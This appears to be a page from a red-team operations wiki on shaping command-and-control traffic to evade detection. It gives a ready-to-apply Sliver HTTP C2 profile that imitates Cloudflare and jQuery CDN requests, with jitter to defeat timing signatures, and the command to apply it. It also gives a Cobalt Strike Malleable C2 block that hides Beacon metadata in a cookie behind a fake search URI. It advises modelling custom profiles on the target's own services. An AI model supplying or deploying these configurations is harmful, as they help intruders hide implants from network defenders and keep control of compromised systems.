# C2 traffic profiles

A C2 framework running on default settings announces itself. Default URIs (`/submit.php`, `/updates`), default
User-Agents, default certificate subjects, default timing intervals: each is a signature the framework ships
with and threat intelligence teams have catalogued. A traffic profile replaces the defaults with something that
reads as legitimate application traffic to a sensor that sees only the wire.

The profile has to be consistent end to end. The implant sends a request shaped by the profile; the
[redirector](../redirectors/nginx-redirector.md) passes or filters it; the frontend terminates TLS using a
certificate that matches the cover domain; the [TLS handshake](../redirectors/tls-mimicry.md) matches the
client claimed. A profile that shapes the URI but leaves the JA3 fingerprint as default Go solves one problem
and ignores another.

## Sliver HTTP C2 configuration

Sliver's HTTP C2 is configured in a YAML profile that controls URIs, headers, and encoding. A profile mimicking
generic CDN polling:

```yaml
implant_name: cdn-poller
connection_strategy: random
poll_timeout: 45
jitter: 0.25
headers:
  - "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  - "Accept-Language: en-GB,en;q=0.5"
  - "Cache-Control: no-cache"
  - "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
paths:
  - /cdn-cgi/trace
  - /cdn-cgi/rum
  - /ajax/libs/jquery/3.7.1/jquery.min.js
  - /wp-includes/js/wp-emoji-release.min.js
response_headers:
  - "Content-Type: application/javascript"
  - "CF-RAY: {{rand_hex 16}}-LHR"
```

The URIs look like Cloudflare telemetry and jQuery CDN fetches. The `CF-RAY` response header is regenerated per
response so it does not repeat. Jitter at 0.25 means the sleep interval varies by ±25%, which breaks the
fixed-interval timing signature that behavioural detection looks for.

Apply with:

```bash
sliver > profiles new --http <frontend-domain> --profile-name cdn-poller
```

## Cobalt Strike Malleable C2

Cobalt Strike's Malleable C2 profiles are the original standard and remain the reference for what a shaped
profile looks like. Open alternatives like Havoc and Sliver have since built comparable mechanisms. A Malleable
profile specifying how Beacon's HTTP GET looks:

```
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/search?q=weather&hl=en";

    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Accept-Language" "en-US,en;q=0.9";
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        output {
            base64;
            print;
        }
    }
}
```

Pre-built profiles circulate on GitHub (jQuery, Bing, OneDriveAPI). All are known to detection vendors.
A custom profile based on a service the target's own estate uses is more durable than a published one.

## What a profile does not fix

A profile shapes the request and response content. It does not rotate the IP, extend the domain's reputation,
or fix the certificate subject. Those are handled at the [frontend](../frontend/masquerading.md) and
[redirector](../redirectors/cdn-fronting.md) layers. A well-shaped profile on a freshly registered domain with
a self-signed certificate achieves little. The layers compound; none of them substitutes for the others.
